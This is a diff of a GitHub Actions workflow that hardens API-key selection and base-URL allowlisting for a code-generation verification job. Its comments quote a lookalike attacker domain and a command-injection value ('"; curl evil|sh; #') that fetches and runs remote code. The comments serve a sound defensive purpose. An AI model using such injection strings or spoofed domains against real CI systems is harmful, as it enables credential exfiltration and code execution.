@@ -8,8 +8,9 @@
 # ubuntu-latest 预装全部所需运行时(node/python/go/JDK/dotnet/ruby/curl),脚本按「探测到才跑」
 # 自动覆盖 7 语言;缺什么标 skip 不阻塞。
 #
-# secrets.VERIFY_API_KEY 必须与 base 匹配:打测试域传 base=https://test-gateway.example(测试站 key),
+# secrets.VERIFY_API_KEY 必须与 base 匹配:打测试域传 base=vars.VERIFY_TEST_BASE 配的那个域(测试站 key),
 # 默认 base=aihubmix.com 则须换主站 key。示例调用是真实计费,单模型约 14 次最小请求。
+# 测试域不写死在公开仓里,配置在仓的 Actions variable `VERIFY_TEST_BASE`(形如 https://test.example.com)。
 name: verify-codegen
 
 # run-name 必须含 external_id:网关按「run-name 含 external_id」对账轮询(与 canon verify 同约定)
@@ -93,20 +94,22 @@ jobs:
         env:
           # key 按 base **精确匹配**选(不用 contains 子串——`https://aihubmix.com.evil.net`
           # 能骗过子串匹配拿到 prod key,harness 再把它真发到攻击者域→凭证外泄)。
-          # 空 / 精确 aihubmix.com → 生产 key;精确 test-gateway.example → 测试 key;其余 → 空(下方 shell 拒)。
-          VERIFY_API_KEY: ${{ (inputs.base == '' || inputs.base == 'https://aihubmix.com') && secrets.VERIFY_API_KEY_PROD || inputs.base == 'https://test-gateway.example' && secrets.VERIFY_API_KEY || '' }}
+          # 空 / 精确 aihubmix.com → 生产 key;精确 vars.VERIFY_TEST_BASE → 测试 key;其余 → 空(下方 shell 拒)。
+          VERIFY_API_KEY: ${{ (inputs.base == '' || inputs.base == 'https://aihubmix.com') && secrets.VERIFY_API_KEY_PROD || (inputs.base != '' && inputs.base == vars.VERIFY_TEST_BASE) && secrets.VERIFY_API_KEY || '' }}
           # inputs 一律走 env 传入,**不**内联进 run: shell(内联会被 Actions 在 shell 解析前展开→
           # `model` 传 `"; curl evil|sh; #` 即命令注入)。脚本内只用带引号的 "$VAR"。
           MODEL_INPUT: ${{ inputs.model }}
           BASE_INPUT: ${{ inputs.base }}
           STREAM_INPUT: ${{ inputs.stream }}
+          TEST_BASE: ${{ vars.VERIFY_TEST_BASE }}
         run: |
           set -o pipefail
           # base 白名单:只允许已知网关域,拒绝任意 host(纵深防御,兜住 key 选择之外的误配/攻击)。
           # base 现在会被直接注入进生成代码(ctx.baseUrl),白名单同时也是「示例里会出现哪些域」的闸门。
           case "$BASE_INPUT" in
-            ""|"https://aihubmix.com"|"https://test-gateway.example") ;;
-            *) echo "invalid base: '$BASE_INPUT' (allowed: https://aihubmix.com, https://test-gateway.example)"; exit 1;;
+            ""|"https://aihubmix.com") ;;
+            "$TEST_BASE") [ -n "$TEST_BASE" ] || { echo "VERIFY_TEST_BASE variable not configured"; exit 1; } ;;
+            *) echo "invalid base: '$BASE_INPUT' (allowed: https://aihubmix.com, \$VERIFY_TEST_BASE)"; exit 1;;
           esac
           if [ -z "$VERIFY_API_KEY" ]; then echo "no API key resolved for base='$BASE_INPUT'"; exit 1; fi
           # 脚本不带默认域(它会被直接注入 ctx.baseUrl),默认值只在这里出现一次——
